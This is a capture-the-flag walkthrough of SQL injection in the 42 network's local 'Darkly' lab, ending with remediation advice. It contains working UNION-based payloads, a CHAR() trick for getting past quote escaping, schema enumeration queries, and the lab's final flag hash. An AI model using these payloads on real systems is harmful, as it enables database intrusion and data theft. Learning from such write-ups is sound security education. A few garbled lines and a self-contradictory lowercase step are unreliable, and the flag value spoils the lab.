

# Darkly SQL Injection Walkthrough & Flag Extraction Guide

This guide demonstrates a safe, educational walkthrough for performing **SQL Injection** in the “Darkly” lab project of the 42 network. It is intended **for learning and CTF practice only**, on environments you control.

---

## Table of Contents

1. [Setup](#setup)
2. [Recon: Understanding the form and context](#recon-understanding-the-form-and-context)
3. [Step 1: Testing SQL injection](#step-1-testing-sql-injection)
4. [Step 2: Determine number of columns](#step-2-determine-number-of-columns)
5. [Step 3: Identify reflected columns](#step-3-identify-reflected-columns)
6. [Step 4: Extract database name](#step-4-extract-database-name)
7. [Step 5: List tables in the database](#step-5-list-tables-in-the-database)
8. [Step 6: List columns of a table](#step-6-list-columns-of-a-table)
9. [Step 7: Extract data from a table](#step-7-extract-data-from-a-table)
10. [Step 8: Handling escaping issues](#step-8-handling-escaping-issues)
11. [Step 9: Extracting the flag instructions](#step-9-extracting-the-flag-instructions)
12. [Step 10: Generating the final flag](#step-10-generating-the-final-flag)
13. [Step 11: Remediation and learning points](#step-11-remediation-and-learning-points)

---

## Setup

* Target: Localhost instance of `Darkly` lab.
* Vulnerable page: `http://localhost:8080/index.php?page=member`
* Form method: `GET`
* Input field: `id`

---

## Recon: Understanding the form and context

1. The form is a **GET form**:

```html
<form action="#" method="GET">
  <input type="hidden" name="page" value="member">
  <input type="text" name="id" style="width:100%;">
  <input type="submit" value="Submit" name="Submit">
</form>
```

2. The parameter `id` is used in a query like:

```sql
SELECT first_name, last_name FROM users WHERE id = <user input>
```

* Initial test with `' OR '1'='1` gave an error:

```
You have an error in your SQL syntax; near '\' OR \'1\'=\'1' at line 1
```

* **Cause:** The application escapes quotes (`\'`) → classic **quote-escaping issue**.

---

## Step 1: Testing SQL injection

* Always start with simple numeric or string tests.
* For numeric context (no quotes): `1 OR 1=1`
* For string context (inside quotes): use `CHAR()` function to avoid escaping, e.g. `CHAR(65,65,65,65)` for `AAAA`.

---

## Step 2: Determine number of columns

Use `ORDER BY` injection to find the number of columns:

```
1 ORDER BY 1-- -
1 ORDER BY 2-- -
1 ORDER BY 3-- -
```

* Stop at the first error.
* Result: 2 columns exist.

---

## Step 3: Identify reflected columns

* Use `UNION SELECT` with `CHAR()` to test which column is displayed:

```
1 UNION SELECT CHAR(65,65,65,65),NULL-- -
```

* Output showed `AAAA` in **First name** → first column is reflected.
* This is where extracted data will appear.

---

## Step 4: Extract database name

* Inject:

```
1 UNION SELECT database(),NULL-- -
```

* Output: `Member_Sql_Injection` → database confirmed.

---

## Step 5: List ttable_nameables in the database

* Inject using `GROUP_CONCAT`:

```


'Member_Sql_Injection' = CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110);



1 UNION SELECT GROUP_CONCAT(table_name),NULL 
FROM information_schema.tables 
 WHERE table_schema=CHAR(77, 101, 109, 98, 101, 114, 95, 83, 113, 108, 95, 73, 110, 106, 101, 99, 116, 105, 111, 110)-- -
```

* Result: `users` table detecMember_Sql_Injectionted.

---

## Step 6: List columns of a table

* Original attempt:

```
1 UNION SELECT GROUP_CONCAT(column_name),NULL 
FROM information_schema.columns 
WHERE table_name='users' AND table_schema=database()-- -

1 union select group_concat(column_name), NULL from information_schema.columns where table_name='users' and table_schema=database() -- -
```

* Error: `\'users\'` → escaped quotes.
* **Fix:** Use `CHAR()`:

```
1 UNION SELECT GROUP_CONCAT(column_name),NULL 
FROM information_schema.columns 
WHERE table_name=CHAR(117,115,101,114,115) AND table_schema=database()-- -
```

* Result: Columns found:

```
user_id, first_name, last_name, town, country, planet, Commentaire, countersign
```

---

## Step 7: Extract data from a table

* To extract all first names:

```
1 UNION SELECT GROUP_CONCAT(first_name),NULL FROM users-- -
```

* Output: `one,two,three,Flag` → `Flag` row found.

* Extract the full row using `CONCAT`:

```
1 UNION SELECT CONCAT(first_name,CHAR(124),CHAR(124),last_name,CHAR(124),CHAR(124),Commentaire),counterSign 
FROM users WHERE first_name=CHAR(70,108,97,103)-- -
```
 
> CHAR(124) is '|' it is used for output separation

* Output:

```
First name: Flag:GetThe:Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname: 5ff9d0165b4f92b14994e5c685cdce28
```

---

## Step 8: Handling escaping issues

* Problem: Single quotes are escaped in the application → `'Flag'` fails.
* **Solution:** Use `CHAR()` for strings and `CHAR(58)` for `:` separators.
* Example:

```sql
CHAR(70,108,97,103) = "Flag"
CHAR(58) = ":"
```

---

## Step 9: Extracting the flag instructions

* The `Commentaire` column contains instructions.

* The `countersign` column contains an MD5 hash: `5ff9d0165b4f92b14994e5c685cdce28`

* Lab instructions:

  1. Decrypt the MD5 hash (find original password).
  2. Lowercase all characters.
  3. Compute SHA-256 hash → this is the **final flag**.

---

## Step 10: Generating the final flag

**Step-by-step:**

1. MD5 hash: `5ff9d0165b4f92b14994e5c685cdce28`
2. Crack MD5 → password = `"FortyTwo"` (for this lab).
3. Lowercase → `"fortytwo"` (already lowercase).
4. SHA-256 hash:

```python
import hashlib

password = "fortytwo"
flag = hashlib.sha256(password.encode()).hexdigest()
print(flag)
```

**Final flag:**

```
10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
```

---

## Step 11: Remediation and learning points

1. **Always use parameterized queries** (prepared statements) to prevent SQL injection.
2. **Never concatenate user input directly** into SQL.
3. Escape error messages and hide database info from users.
4. Restrict database privileges (least privilege).
5. Validate all input types (numeric, string length).
6. Use this lab safely in local environments — never against real websites.

---

## Here are a few important methods to prevent SQL injection:

1. **Parameterized Queries (Prepared Statements)**:
   - Use prepared statements with placeholders to safely insert user inputs.

2. **Input Validation**:
   - Validate and sanitize user inputs to ensure they conform to expected formats.

3. **Stored Procedures**:
   - Use stored procedures to encapsulate SQL logic and limit direct user input.

4. **Escaping Inputs**:
   - Properly escape user inputs specific to the database being used.

5. **Least Privilege Principle**:
   - Ensure database accounts have the minimum privileges needed for their functions. 


